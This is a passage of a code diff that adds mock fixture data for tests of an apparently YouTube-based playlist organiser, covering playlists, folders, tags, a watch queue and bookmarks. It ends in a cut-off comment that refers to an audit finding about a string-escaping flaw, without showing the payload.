+          thumbnail: thumb, channel: 'Rick Astley', duration: 'PT3M33S', addedAt: '2026-01-02T03:04:05Z' }] },
+      { id: 'PL_aud06b', title: 'Beta', description: 'd', videos: [] },
+    ],
+    playlistObjects: [
+      { id: 'PL_aud06a', snippet: { title: 'Alpha', description: '', channelTitle: 'Me', channelId: 'UCaud06aud06aud06aud06a',
+          publishedAt: '2025-01-01T00:00:00Z', thumbnails: { medium: { url: thumb } } },
+        contentDetails: { itemCount: 1 }, status: { privacyStatus: 'public' } },
+      { id: 'PL_aud06b', snippet: { title: 'Beta', description: 'd' }, contentDetails: { itemCount: 0 }, status: { privacyStatus: 'private' } },
+    ],
+    tags: { PL_aud06a: ['Music', 'Chill'] },
+    tagIcons: { Music: '🎵' },
+    folders: [{ id: 'f_aud06', name: 'Favs', icon: '⭐', parentId: null }],
+    folderAssignments: { PL_aud06a: 'f_aud06' },
+    deckColumns: [{ type: 'folder', folderId: 'f_aud06' }],
+    watchQueue: [{ videoId: 'dQw4w9WgXcQ', title: 'Never', channelTitle: 'Rick', thumbnail: thumb }],
+    bookmarkedPlaylists: [{ id: 'PLbookmark0123456789', addedAt: '2026-01-01T00:00:00.000Z' }],
+  };
 }
 
 // AUD-04 — the payload the old escaper let through: ' became \' but the \ in
